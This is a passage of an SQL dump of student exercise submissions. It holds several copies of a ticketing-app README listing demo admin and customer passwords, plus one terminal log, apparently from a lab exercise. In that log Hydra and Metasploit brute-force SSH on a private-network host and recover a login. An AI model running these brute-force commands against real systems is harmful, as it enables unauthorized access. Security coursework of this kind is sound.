apply sticky bit to dirdylan directory.\r\nANS:\r\n\r\nb) Describe how to change file permissions using the chmod command.\r\n(Hint: In your answer, provide example(s) of symbolic and numeric representation for setting file permissions.)\r\n\r\n', '2024-12-03 16:26:42'),
(12, 2, 'sshDA', 'README.txt', '###########################################\r\n##					 ##\r\n## Japan Online Ticket System README.txt ##\r\n##					 ##\r\n###########################################\r\n1. Launching the application\r\n	Requirement:\r\n		1) Apache NetBeans IDE 16 and above\r\n		2) XAMPP 8.2.12 / PHP 8.2.12 version and above\r\n		3) Composer 2.7.6 version and above\r\n\r\n	Installation step:\r\n		1）Download the source code zipped folder\r\n		2) Extract the zipped folder\r\n		3) Open XAMPP, start \"Apache\" & \"MySQL\"\r\n		4) Click \"Admin\" from MySQL\r\n		5) Click \"SQL\" inside the phpMyAdmin\r\n		5) Copy and paste the JapanTicketingDB.sql and click \"Go\"\r\n		6) Copy and paste the InsertData.sql and click \"Go\" \r\n		7) Open the command prompt and go to the extracted path.\r\n		8) Enter : composer install\r\n		\r\n\r\n	How to run:\r\n		1) Open the extracted folder from Apache NetBeans ADE 16\r\n		2) Right click the folder name, go to properties\r\n		3) Go to \"Run Configuration\"\r\n		4) Make sure the Project URL is : http://localhost/JapaneseOnlineTicketingSystem/, if not replace it.\r\n		5) Make sure the Index File is : index.php, if not replace it.\r\n		6) Click \"Ok\"\r\n		7) Run the program (**Ensure the Apache & MySQL is open in XAMPP**)\r\n\r\n2. User Account detail\r\n	A) Customer:\r\n		Username: customer1\r\n		Password: cust1234!\r\n		Email: cust1@gmail.com\r\n\r\n	B) Admin:\r\n		Username: admin\r\n		Password: admin123!\r\n		Email: admin@gmail.com\r\n\r\n\r\n###########################################\r\n##					 ##\r\n## 	     END OF README.txt	 	 ##\r\n##					 ##\r\n###########################################\r\n', '2024-12-03 16:26:53');
INSERT INTO `submitted_files` (`file_id`, `student_id`, `exercise_id`, `file_name`, `file_content`, `submission_date`) VALUES
(13, 2, 'sshDB', 'command_log_20241124_024144.txt', 'Script started on 2024-11-24 02:41:44-05:00 [COMMAND=\"bash\" TERM=\"xterm-256color\" TTY=\"/dev/pts/0\" COLUMNS=\"77\" LINES=\"27\"]\n[~]\n\n$ yhydra -L users.txt -P passwords.txt ssh://192.168.43.133\nhydra -L users.txt -P passwords.txt ssh://192.168.43.133\n\nHydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).\n\nHydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-11-24 02:44:14\n[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4\n[ERROR] File for logins not found: users.txt\n\n[~]\n\n$ cd /Desktop\n\nbash: cd: /Desktop: No such file or directory\n\n[~]\n\n$ cd /Desktop~/Desktop\n\n\n[~/Desktop]\n$ hydra -L users.txt -P passwords.txt ssh://192.168.43.133\nhydra -L users.txt -P passwords.txt ssh://192.168.43.133\n\nHydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).\n\nHydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-11-24 02:44:45\n[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4\n[DATA] max 16 tasks per 1 server, overall 16 tasks, 16 login tries (l:4/p:4), ~1 try per task\n[DATA] attacking ssh://192.168.43.133:22/\n[22][ssh] host: 192.168.43.133   login: yiyangtan   password: kali\n1 of 1 target successfully completed, 1 valid password found\nHydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-11-24 02:44:50\n\n[~/Desktop]\n$ msfconsole\nmsfconsole\n\nMetasploit tip: Use sessions -1 to interact with the last opened session\n[*] Starting the Metasploit Framework console.../\n[*] Starting the Metasploit Framework console...-\n[*] Starting the Metasploit Framework console...\\\n[*] starting the Metasploit Framework console...|\n[*] STarting the Metasploit Framework console.../\n[*] StArting the Metasploit Framework console...-\n[*] StaRting the Metasploit Framework console...\\\n[*] StarTing the Metasploit Framework console...|\n[*] StartIng the Metasploit Framework console.../\n[*] StartiNg the Metasploit Framework console...-\n[*] StartinG the Metasploit Framework console...\\\n[*] Starting the Metasploit Framework console...|\n[*] Starting The Metasploit Framework console.../\n[*] Starting tHe Metasploit Framework console...-\n[*] Starting thE Metasploit Framework console...\\\n[*] Starting the Metasploit Framework console...|\n[*] Starting the metasploit Framework console.../\n[*] Starting the MEtasploit Framework console...-\n[*] Starting the MeTasploit Framework console...\\\n[*] Starting the MetAsploit Framework console...|\n[*] Starting the MetaSploit Framework console.../\n[*] Starting the MetasPloit Framework console...-\n[*] Starting the MetaspLoit Framework console...\\\n[*] Starting the MetasplOit Framework console...|\n[*] Starting the MetasploIt Framework console.../\n[*] Starting the MetasploiT Framework console...-\n[*] Starting the Metasploit Framework console...\\\n[*] Starting the Metasploit framework console...|\n[*] Starting the Metasploit FRamework console.../\n[*] Starting the Metasploit FrAmework console...-\n[*] Starting the Metasploit FraMework console...\\\n[*] Starting the Metasploit FramEwork console...|\n[*] Starting the Metasploit FrameWork console.../\n[*] Starting the Metasploit FramewOrk console...-\n[*] Starting the Metasploit FramewoRk console...\\\n[*] Starting the Metasploit FrameworK console...|\n[*] Starting the Metasploit Framework console.../\n[*] Starting the Metasploit Framework Console...-\n[*] Starting the Metasploit Framework cOnsole...\\\n[*] Starting the Metasploit Framework coNsole...|\n[*] Starting the Metasploit Framework conSole.../\n[*] Starting the Metasploit Framework consOle...-\n[*] Starting the Metasploit Framework consoLe...\\\n[*] Starting the Metasploit Framework consolE...|\n[*] Starting the Metasploit Framework console.../\n[*] Starting the Metasploit Framework console...-\n[*] Starting the Metasploit Framework console...\\\n[*] Starting the Metasploit Framework console...|\n\n                                                  \nCall trans opt: received. 2-19-98 13:24:18 REC:Loc\n\n     Trace program: running\n\n           wake up, Neo...\n        the matrix has you\n      follow the white rabbit.\n\n          knock, knock, Neo.\n\n                        (`.         ,-,\n                        ` `.    ,;\' /\n                         `.  ,\'/ .\'\n                          `. X /.\'\n                .-;--\'\'--.._` ` (\n              .\'            /   `\n             ,           ` \'   Q \'\n             ,         ,   `._    \\\n          ,.|         \'     `-.;_\'\n          :  . `  ;    `  ` --,.._;\n           \' `    ,   )   .\'\n              `._ ,  \'   /_\n                 ; ,\'\'-,;\' ``-\n                  ``-..__``--`\n\n                             https://metasploit.com\n\n\n       =[ metasploit v6.4.9-dev                           ]\n+ -- --=[ 2420 exploits - 1248 auxiliary - 423 post       ]\n+ -- --=[ 1468 payloads - 47 encoders - 11 nops           ]\n+ -- --=[ 9 evasion                                       ]\n\nMetasploit Documentation: https://docs.metasploit.com/\n\nmsf6 > search ssh\n\n\nMatching Modules\n================\n\n   #    Name                                                               Disclosure Date  Rank       Check  Description\n   -    ----                                                               ---------------  ----       -----  -----------\n   0    exploit/linux/http/alienvault_exec                                 2017-01-31       excellent  Yes    AlienVault OSSIM/USM Remote Code Execution\n   1    auxiliary/scanner/ssh/apache_karaf_command_execution               2016-02-09       normal     No     Apache Karaf Default Credentials Command Execution\n   2    auxiliary/scanner/ssh/karaf_login                                  .                normal     No     Apache Karaf Login Utility\n   3    exploit/apple_ios/ssh/cydia_default_ssh                            2007-07-02       excellent  No     Apple iOS Default SSH Password Vulnerability\n   4    exploit/unix/ssh/arista_tacplus_shell                              2020-02-02       great      Yes    Arista restricted shell escape (with privesc)\n   5    exploit/unix/ssh/array_vxag_vapv_privkey_privesc                   2014-02-03       excellent  No     Array Networks vAPV and vxAG Private Key Privilege Escalation Code Execution\n   6    exploit/linux/ssh/ceragon_fibeair_known_privkey                    2015-04-01       excellent  No     Ceragon FibeAir IP-10 SSH Private Key Exposure\n   7    auxiliary/scanner/ssh/cerberus_sftp_enumusers                      2014-05-27       normal     No     Cerberus FTP Server SFTP Username Enumeration\n   8    auxiliary/dos/cisco/cisco_7937g_dos                                2020-06-02       normal     No     Cisco 7937G Denial-of-Service Attack\n   9    auxiliary/admin/http/cisco_7937g_ssh_privesc                       2020-06-02       normal     No     Cisco 7937G SSH Privilege Escalation\n   10   exploit/linux/http/cisco_asax_sfr_rce                              2022-06-22       excellent  Yes    Cisco ASA-X with FirePOWER Services Authenticated Command Injection\n   11     \\_ target: Shell Dropper                                         .                .          .      .\n   12     \\_ target: Linux Dropper                                         .                .          .      .\n   13   auxiliary/scanner/http/cisco_firepower_login                       .                normal     No     Cisco Firepower Management Console 6.0 Login\n   14   exploit/linux/ssh/cisco_ucs_scpuser                                2019-08-21       excellent  No     Cisco UCS Director default scpuser password\n   15   auxiliary/scanner/ssh/eaton_xpert_backdoor                         2018-07-18       normal     No     Eaton Xpert Meter SSH Private Key Exposure Scanner\n   16   exploit/linux/ssh/exagrid_known_privkey                            2016-04-07       excellent  No     ExaGrid Known SSH Key and Default Password\n   17   exploit/linux/ssh/f5_bigip_known_privkey                           2012-06-11       excellent  No     F5 BIG-IP SSH Private Key Exposure\n   18   exploit/linux/http/fortinet_authentication_bypass_cve_2022_40684   2022-10-10       excellent  Yes    Fortinet FortiOS, FortiProxy, and FortiSwitchManager authentication bypass.\n   19   auxiliary/scanner/ssh/fortinet_backdoor                            2016-01-09       normal     No     Fortinet SSH Backdoor Scanner\n   20   post/windows/manage/forward_pageant                                .                normal     No     Forward SSH Agent Requests To Remote Pageant\n   21   exploit/windows/ssh/freeftpd_key_exchange                          2006-05-12       average    No     FreeFTPd 1.0.10 Key Exchange Algorithm String Buffer Overflow\n   22     \\_ target: Windows 2000 SP0-SP4 English                          .                .          .      .\n   23     \\_ target: Windows 2000 SP0-SP4 German                           .                .          .      .\n   24     \\_ target: Windows XP SP0-SP1 English                            .                .          .      .\n   25     \\_ target: Windows XP SP2 English                                .                .          .      .\n   26   exploit/windows/ssh/freesshd_key_exchange                          2006-05-12       average    No     FreeSSHd 1.0.9 Key Exchange Algorithm String Buffer Overflow\n   27     \\_ target: Windows 2000 Pro SP4 English                          .                .          .      .\n   28     \\_ target: Windows XP Pro SP0 English                            .                .          .      .\n   29     \\_ target: Windows XP Pro SP1 English                            .                .          .      .\n   30   exploit/windows/ssh/freesshd_authbypass                            2010-08-11       excellent  Yes    Freesshd Authentication Bypass\n   31     \\_ target: PowerShell                                            .                .          .      .\n   32     \\_ target: CmdStager upload                                      .                .          .      .\n   33   auxiliary/scanner/http/gitlab_user_enum                            2014-11-21       normal     No     GitLab User Enumeration\n   34   exploit/multi/http/gitlab_shell_exec                               2013-11-04       excellent  Yes    Gitlab-shell Code Execution\n   35     \\_ target: Linux                                                 .                .          .      .\n   36     \\_ target: Linux (x64)                                           .                .          .      .\n   37     \\_ target: Unix (CMD)                                            .                .          .      .\n   38     \\_ target: Python                                                .                .          .      .\n   39   exploit/linux/ssh/ibm_drm_a3user                                   2020-04-21       excellent  No     IBM Data Risk Manager a3user Default Password\n   40   post/windows/manage/install_ssh                                    .                normal     No     Install OpenSSH for Windows\n   41   payload/generic/ssh/interact                                       .                normal     No     Interact with Established SSH Connection\n   42   post/multi/gather/jenkins_gather                                   .                normal     No     Jenkins Credential Collector\n   43   auxiliary/scanner/ssh/juniper_backdoor                             2015-12-20       normal     No     Juniper SSH Backdoor Scanner\n   44   exploit/freebsd/http/junos_phprc_auto_prepend_file                 2023-08-17       excellent  Yes    Junos OS PHPRC Environment Variable Manipulation RCE\n   45     \\_ target: PHP In-Memory                                         .                .          .      .\n   46     \\_ target: Interactive SSH with jail break                       .                .          .      .\n   47   auxiliary/scanner/ssh/detect_kippo                                 .                normal     No     Kippo SSH Honeypot Detector\n   48   post/linux/gather/enum_network                                     .                normal     No     Linux Gather Network Information\n   49   exploit/linux/local/ptrace_traceme_pkexec_helper                   2019-07-04       excellent  Yes    Linux Polkit pkexec helper PTRACE_TRACEME local root exploit\n   50   exploit/linux/ssh/loadbalancerorg_enterprise_known_privkey         2014-03-17       excellent  No     Loadbalancer.org Enterprise VA SSH Private Key Exposure\n   51   exploit/multi/http/git_submodule_command_exec                      2017-08-10       excellent  No     Malicious Git HTTP Server For CVE-2017-1000117\n   52   exploit/linux/ssh/mercurial_ssh_exec                               2017-04-18       excellent  No     Mercurial Custom hg-ssh Wrapper Remote Code Exec\n   53   exploit/linux/ssh/microfocus_obr_shrboadmin                        2020-09-21       excellent  No     Micro Focus Operations Bridge Reporter shrboadmin default password\n   54   post/multi/gather/ssh_creds                                        .                normal     No     Multi Gather OpenSSH PKI Credentials Collection\n   55   exploit/solaris/ssh/pam_username_bof                               2020-10-20       normal     Yes    Oracle Solaris SunSSH PAM parse_user_name() Buffer Overflow\n   56     \\_ target: SunSSH 1.1.5 / Solaris 10u11 1/13 (x86) / VMware      .                .          .      .\n   57     \\_ target: SunSSH 1.1.5 / Solaris 10u11 1/13 (x86) / VirtualBox  .                .          .      .\n   58   auxiliary/gather/prometheus_api_gather                             2016-07-01       normal     No     Prometheus API Information Gather\n   59   exploit/windows/ssh/putty_msg_debug                                2002-12-16       normal     No     PuTTY Buffer Overflow\n   60     \\_ target: Windows 2000 SP4 English                              .                .          .      .\n   61     \\_ target: Windows XP SP2 English                                .                .          .      .\n   62     \\_ target: Windows 2003 SP1 English                              .                .          .      .\n   63   post/windows/gather/enum_putty_saved_sessions                      .                normal     No     PuTTY Saved Sessions Enumeration Module\n   64   auxiliary/gather/qnap_lfi                                          2019-11-25       normal     Yes    QNAP QTS and Photo Station Local File Inclusion\n   65   exploit/linux/ssh/quantum_dxi_known_privkey                        2014-03-17       excellent  No     Quantum DXi V1000 SSH Private Key Exposure\n   66   exploit/linux/ssh/quantum_vmpro_backdoor                           2014-03-17       excellent  No     Quantum vmPRO Backdoor Command\n   67   auxiliary/fuzzers/ssh/ssh_version_15                               .                normal     No     SSH 1.5 Version Fuzzer\n   68   auxiliary/fuzzers/ssh/ssh_version_2                                .                normal     No     SSH 2.0 Version Fuzzer\n   69   auxiliary/fuzzers/ssh/ssh_kexinit_corrupt                          .                normal     No     SSH Key Exchange Init Corruption\n   70   post/linux/manage/sshkey_persistence                               .                excellent  No     SSH Key Persistence\n   71   post/windows/manage/sshkey_persistence                             .                good       No     SSH Key Persistence\n   72   auxiliary/scanner/ssh/ssh_login                                    .                normal     No     SSH Login Check Scanner\n   73   auxiliary/scanner/ssh/ssh_identify_pubkeys                         .                normal     No     SSH Public Key Acceptance Scanner\n   74   auxiliary/scanner/ssh/ssh_login_pubkey                             .                normal     No     SSH Public Key Login Scanner\n   75   exploit/multi/ssh/sshexec                                          1999-01-01       manual     No     SSH User Code Execution\n   76     \\_ target: Linux Command                                         .                .          .      .\n   77     \\_ target: Linux x86                                             .                .          .      .\n   78     \\_ target: Linux x64                                             .                .          .      .\n   79     \\_ target: Linux armle                                           .                .          .      .\n   80     \\_ target: Linux mipsle                                          .                .          .      .\n   81     \\_ target: Linux mipsbe                                          .                .          .      .\n   82     \\_ target: Linux aarch64                                         .                .          .      .\n   83     \\_ target: OSX x86                                               .                .          .      .\n   84     \\_ target: OSX x64                                               .                .          .      .\n   85     \\_ target: BSD x86                                               .                .          .      .\n   86     \\_ target: BSD x64                                               .                .          .      .\n   87     \\_ target: Python                                                .                .          .      .\n   88     \\_ target: Unix Cmd                                              .                .          .      .\n   89     \\_ target: Interactive SSH                                       .                .          .      .\n   90   auxiliary/scanner/ssh/ssh_enumusers                                .                normal     No     SSH Username Enumeration\n   91     \\_ action: Malformed Packet                                      .                .          .      Use a malformed packet\n   92     \\_ action: Timing Attack                                         .                .          .      Use a timing attack\n   93   auxiliary/fuzzers/ssh/ssh_version_corrupt                          .                normal     No     SSH Version Corruption\n   94   auxiliary/scanner/ssh/ssh_version                                  .                normal     No     SSH Version Scanner\n   95   post/multi/gather/saltstack_salt                                   .                normal     No     SaltStack Salt Information Gatherer\n   96   exploit/unix/http/schneider_electric_net55xx_encoder               2019-01-25       excellent  Yes    Schneider Electric Pelco Endura NET55XX Encoder\n   97   exploit/windows/ssh/securecrt_ssh1                                 2002-07-23       average    No     SecureCRT SSH1 Buffer Overflow\n   98   exploit/linux/ssh/solarwinds_lem_exec                              2017-03-17       excellent  No     SolarWinds LEM Default SSH Password Remote Code Execution\n   99   exploit/linux/http/sourcegraph_gitserver_sshcmd                    2022-02-18       excellent  Yes    Sourcegraph gitserver sshCommand RCE\n   100    \\_ target: Automatic                                             .                .          .      .\n   101    \\_ target: Unix Command                                          .                .          .      .\n   102    \\_ target: Linux Dropper                                         .                .          .      .\n   103  exploit/linux/ssh/symantec_smg_ssh                                 2012-08-27       excellent  No     Symantec Messaging Gateway 9.5 Default SSH Password Vulnerability\n   104  exploit/linux/http/symantec_messaging_gateway_exec                 2017-04-26       excellent  No     Symantec Messaging Gateway Remote Code Execution\n   105  exploit/windows/ssh/sysax_ssh_username                             2012-02-27       normal     Yes    Sysax 5.53 SSH Username Buffer Overflow\n   106    \\_ target: Sysax 5.53 on Win XP SP3 / Win2k3 SP0                 .                .          .      .\n   107    \\_ target: Sysax 5.53 on Win2K3 SP1/SP2                          .                .          .      .\n   108  auxiliary/dos/windows/ssh/sysax_sshd_kexchange                     2013-03-17       normal     No     Sysax Multi-Server 6.10 SSHD Key Exchange Denial of Service\n   109  exploit/unix/ssh/tectia_passwd_changereq                           2012-12-01       excellent  Yes    Tectia SSH USERAUTH Change Request Password Reset Vulnerability\n   110  auxiliary/scanner/ssh/ssh_enum_git_keys                            .                normal     No     Test SSH Github Access\n   111  exploit/linux/http/ubiquiti_airos_file_upload                      2016-02-13       excellent  No     Ubiquiti airOS Arbitrary File Upload\n   112  payload/cmd/unix/reverse_ssh                                       .                normal     No     Unix Command Shell, Reverse TCP SSH\n   113  payload/cmd/unix/bind_aws_instance_connect                         .                normal     No     Unix SSH Shell, Bind Instance Connect (via AWS API)\n   114  exploit/linux/ssh/vmware_vrni_known_privkey                        2023-08-29       excellent  No     VMWare Aria Operations for Networks (vRealize Network Insight) SSH Private Key Exposure\n   115    \\_ target: 6.0_platform                                          .                .          .      .\n   116    \\_ target: 6.0_proxy                                             .                .          .      .\n   117    \\_ target: 6.1_platform                                          .                .          .      .\n   118    \\_ target: 6.1_proxy                                             .                .          .      .\n   119    \\_ target: 6.2_collector                                         .                .          .      .\n   120    \\_ target: 6.2_platform                                          .                .          .      .\n   121    \\_ target: 6.3_collector                                         .                .          .      .\n   122    \\_ target: 6.3_platform                                          .                .          .      .\n   123    \\_ target: 6.4_collector                                         .                .          .      .\n   124    \\_ target: 6.4_platform                                          .                .          .      .\n   125    \\_ target: 6.5_collector                                         .                .          .      .\n   126    \\_ target: 6.5_platform                                          .                .          .      .\n   127    \\_ target: 6.6_collector                                         .                .          .      .\n   128    \\_ target: 6.6_platform                                          .                .          .      .\n   129    \\_ target: 6.7_collector                                         .                .          .      .\n   130    \\_ target: 6.7_platform                                          .                .          .      .\n   131    \\_ target: 6.8_collector                                         .                .          .      .\n   132    \\_ target: 6.8_platform                                          .                .          .      .\n   133    \\_ target: 6.9_collector                                         .                .          .      .\n   134    \\_ target: 6.9_platform                                          .                .          .      .\n   135    \\_ target: 6.10_collector                                        .                .          .      .\n   136    \\_ target: 6.10_platform                                         .                .          .      .\n   137    \\_ target: All                                                   .                .          .      .\n   138  exploit/linux/ssh/vmware_vdp_known_privkey                         2016-12-20       excellent  No     VMware VDP Known SSH Key\n   139  exploit/multi/http/vmware_vcenter_uploadova_rce                    2021-02-23       manual     Yes    VMware vCenter Server Unauthenticated OVA File Upload RCE\n   140    \\_ target: VMware vCenter Server <= 6.7 Update 1b (Linux)        .                .          .      .\n   141    \\_ target: VMware vCenter Server <= 6.7 Update 3j (Windows)      .                .          .      .\n   142  exploit/linux/ssh/vyos_restricted_shell_privesc                    2018-11-05       great      Yes    VyOS restricted-shell Escape and Privilege Escalation\n   143  post/windows/gather/credentials/whatsupgold_credential_dump        2022-11-22       manual     No     WhatsUp Gold Credentials Dump\n   144    \\_ action: Decrypt                                               .                .          .      Decrypt WhatsUp Gold database export CSV file\n   145    \\_ action: Dump                                                  .                .          .      Export WhatsUp Gold database and perform decryption\n   146    \\_ action: Export                                                .                .          .      Export WhatsUp Gold database without decryption\n   147  post/windows/gather/credentials/mremote                            .                normal     No     Windows Gather mRemote Saved Password Extraction\n   148  exploit/windows/local/unquoted_service_path                        2001-10-25       great      Yes    Windows Unquoted Service Path Privilege Escalation\n   149  exploit/linux/http/zyxel_lfi_unauth_ssh_rce                        2022-02-01       excellent  Yes    Zyxel chained RCE using LFI and weak password derivation algorithm\n   150    \\_ target: Unix Command                                          .                .          .      .\n   151    \\_ target: Linux Dropper                                         .                .          .      .\n   152    \\_ target: Interactive SSH                                       .                .          .      .\n   153  auxiliary/scanner/ssh/libssh_auth_bypass                           2018-10-16       normal     No     libssh Authentication Bypass Scanner\n   154    \\_ action: Execute                                               .                .          .      Execute a command\n   155    \\_ action: Shell                                                 .                .          .      Spawn a shell\n   156  exploit/linux/http/php_imap_open_rce                               2018-10-23       good       Yes    php imap_open Remote Code Execution\n   157    \\_ target: prestashop                                            .                .          .      .\n   158    \\_ target: suitecrm                                              .                .          .      .\n   159    \\_ target: e107v2                                                .                .          .      .\n   160    \\_ target: Horde IMP H3                                          .                .          .      .\n   161    \\_ target: custom                                                .                .          .      .\n\n\nInteract with a module by name or index. For example info 161, use 161 or use exploit/linux/http/php_imap_open_rce\nAfter interacting with a module you can manually set a TARGET with set TARGET \'custom\'\n\nmsf6 > use auxiliary/scanner/ssh/ssh_login\n\nmsf6 auxiliary(scanner/ssh/ssh_login) > set rhosts 192.168.43.133\n\nrhosts => 192.168.43.133\nmsf6 auxiliary(scanner/ssh/ssh_login) > set stop_on_success true\n\nstop_on_success => true\nmsf6 auxiliary(scanner/ssh/ssh_login) > set user_file users.txt\n\nuser_file => users.txt\nmsf6 auxiliary(scanner/ssh/ssh_login) > set pass_file passwords.txt\n\npass_file => passwords.txt\nmsf6 auxiliary(scanner/ssh/ssh_login) > set verbose true\n\nverbose => true\nmsf6 auxiliary(scanner/ssh/ssh_login) > run\n\n\n[*] 192.168.43.133:22 - Starting bruteforce\n[-] 192.168.43.133:22 - Failed: \'kali:admin\'\n[!] No active DB -- Credential data will not be saved!\n[-] 192.168.43.133:22 - Failed: \'kali:yiyantan\'\n[-] 192.168.43.133:22 - Failed: \'kali:abc123\'\n[-] 192.168.43.133:22 - Failed: \'kali:kali\'\n[-] 192.168.43.133:22 - Failed: \'tarumt:admin\'\n[-] 192.168.43.133:22 - Failed: \'tarumt:yiyantan\'\n[-] 192.168.43.133:22 - Failed: \'tarumt:abc123\'\n[-] 192.168.43.133:22 - Failed: \'tarumt:kali\'\n[-] 192.168.43.133:22 - Failed: \'admin:admin\'\n[-] 192.168.43.133:22 - Failed: \'admin:yiyantan\'\n[-] 192.168.43.133:22 - Failed: \'admin:abc123\'\n[-] 192.168.43.133:22 - Failed: \'admin:kali\'\n[-] 192.168.43.133:22 - Failed: \'yiyangtan:admin\'\n[-] 192.168.43.133:22 - Failed: \'yiyangtan:yiyantan\'\n[-] 192.168.43.133:22 - Failed: \'yiyangtan:abc123\'\n[+] 192.168.43.133:22 - Success: \'yiyangtan:kali\' \'\'\n[*] SSH session 1 opened (192.168.43.130:36359 -> 192.168.43.133:22) at 2024-11-24 02:46:41 -0500\n[-] 192.168.43.133:22 - While a session may have opened, it may be bugged.  If you experience issues with it, re-run this module with \'set gatherproof false\'.  Also consider submitting an issue at github.com/rapid7/metasploit-framework with device details so it can be handled in the future.\n[*] Scanned 1 of 1 hosts (100% complete)\n[*] Auxiliary module execution completed\nmsf6 auxiliary(scanner/ssh/ssh_login) > exit\n\n[*] You have active sessions open, to exit anyway type \"exit -y\"\nmsf6 auxiliary(scanner/ssh/ssh_login) > exit -y\n\n\n[~/Desktop]\n$ exit\n\nexit\n\nScript done on 2024-11-24 02:48:08-05:00 [COMMAND_EXIT_CODE=\"0\"]\n\n', '2024-12-03 06:27:05'),
(14, 2, 'sshDC', 'README.txt', '###########################################\r\n##					 ##\r\n## Japan Online Ticket System README.txt ##\r\n##					 ##\r\n###########################################\r\n1. Launching the application\r\n	Requirement:\r\n		1) Apache NetBeans IDE 16 and above\r\n		2) XAMPP 8.2.12 / PHP 8.2.12 version and above\r\n		3) Composer 2.7.6 version and above\r\n\r\n	Installation step:\r\n		1）Download the source code zipped folder\r\n		2) Extract the zipped folder\r\n		3) Open XAMPP, start \"Apache\" & \"MySQL\"\r\n		4) Click \"Admin\" from MySQL\r\n		5) Click \"SQL\" inside the phpMyAdmin\r\n		5) Copy and paste the JapanTicketingDB.sql and click \"Go\"\r\n		6) Copy and paste the InsertData.sql and click \"Go\" \r\n		7) Open the command prompt and go to the extracted path.\r\n		8) Enter : composer install\r\n		\r\n\r\n	How to run:\r\n		1) Open the extracted folder from Apache NetBeans ADE 16\r\n		2) Right click the folder name, go to properties\r\n		3) Go to \"Run Configuration\"\r\n		4) Make sure the Project URL is : http://localhost/JapaneseOnlineTicketingSystem/, if not replace it.\r\n		5) Make sure the Index File is : index.php, if not replace it.\r\n		6) Click \"Ok\"\r\n		7) Run the program (**Ensure the Apache & MySQL is open in XAMPP**)\r\n\r\n2. User Account detail\r\n	A) Customer:\r\n		Username: customer1\r\n		Password: cust1234!\r\n		Email: cust1@gmail.com\r\n\r\n	B) Admin:\r\n		Username: admin\r\n		Password: admin123!\r\n		Email: admin@gmail.com\r\n\r\n\r\n###########################################\r\n##					 ##\r\n## 	     END OF README.txt	 	 ##\r\n##					 ##\r\n###########################################\r\n', '2024-12-03 16:27:18'),
(15, 3, 'sshOA1', 'README.txt', '###########################################\r\n##					 ##\r\n## Japan Online Ticket System README.txt ##\r\n##					 ##\r\n###########################################\r\n1. Launching the application\r\n	Requirement:\r\n		1) Apache NetBeans IDE 16 and above\r\n		2) XAMPP 8.2.12 / PHP 8.2.12 version and above\r\n		3) Composer 2.7.6 version and above\r\n\r\n	Installation step:\r\n		1）Download the source code zipped folder\r\n		2) Extract the zipped folder\r\n		3) Open XAMPP, start \"Apache\" & \"MySQL\"\r\n		4) Click \"Admin\" from MySQL\r\n		5) Click \"SQL\" inside the phpMyAdmin\r\n		5) Copy and paste the JapanTicketingDB.sql and click \"Go\"\r\n		6) Copy and paste the InsertData.sql and click \"Go\" \r\n		7) Open the command prompt and go to the extracted path.\r\n		8) Enter : composer install\r\n		\r\n\r\n	How to run:\r\n		1) Open the extracted folder from Apache NetBeans ADE 16\r\n		2) Right click the folder name, go to properties\r\n		3) Go to \"Run Configuration\"\r\n		4) Make sure the Project URL is : http://localhost/JapaneseOnlineTicketingSystem/, if not replace it.\r\n		5) Make sure the Index File is : index.php, if not replace it.\r\n		6) Click \"Ok\"\r\n		7) Run the program (**Ensure the Apache & MySQL is open in XAMPP**)\r\n\r\n2. User Account detail\r\n	A) Customer:\r\n		Username: customer1\r\n		Password: cust1234!\r\n		Email: cust1@gmail.com\r\n\r\n	B) Admin:\r\n		Username: admin\r\n		Password: admin123!\r\n		Email: admin@gmail.com\r\n\r\n\r\n###########################################\r\n##					 ##\r\n## 	     END OF README.txt	 	 ##\r\n##					 ##\r\n###########################################\r\n', '2024-12-04 00:27:18'),
(16, 3, 'sshOA2', 'README.txt', '###########################################\r\n##					 ##\r\n## Japan Online Ticket System README.txt ##\r\n##					 ##\r\n###########################################\r\n1. Launching the application\r\n	Requirement:\r\n		1) Apache NetBeans IDE 16 and above\r\n		2) XAMPP 8.2.12 / PHP 8.2.12 version and above\r\n		3) Composer 2.7.6 version and above\r\n\r\n	Installation step:\r\n		1）Download the source code zipped folder\r\n		2) Extract the zipped folder\r\n		3) Open XAMPP, start \"Apache\" & \"MySQL\"\r\n		4) Click \"Admin\" from MySQL\r\n		5) Click \"SQL\" inside the phpMyAdmin\r\n		5) Copy and paste the JapanTicketingDB.sql and click \"Go\"\r\n		6) Copy and paste the InsertData.sql and click \"Go\" \r\n		7) Open the command prompt and go to the extracted path.\r\n		8) Enter : composer install\r\n		\r\n\r\n	How to run:\r\n		1) Open the extracted folder from Apache NetBeans ADE 16\r\n		2) Right click the folder name, go to properties\r\n		3) Go to \"Run Configuration\"\r\n		4) Make sure the Project URL is : http://localhost/JapaneseOnlineTicketingSystem/, if not replace it.\r\n		5) Make sure the Index File is : index.php, if not replace it.\r\n		6) Click \"Ok\"\r\n		7) Run the program (**Ensure the Apache & MySQL is open in XAMPP**)\r\n\r\n2. User Account detail\r\n	A) Customer:\r\n		Username: customer1\r\n		Password: cust1234!\r\n		Email: cust1@gmail.com\r\n\r\n	B) Admin:\r\n		Username: admin\r\n		Password: admin123!\r\n		Email: admin@gmail.com\r\n\r\n\r\n###########################################\r\n##					 ##\r\n## 	     END OF README.txt	 	 ##\r\n##					 ##\r\n###########################################\r\n', '2024-12-04 00:28:18'),
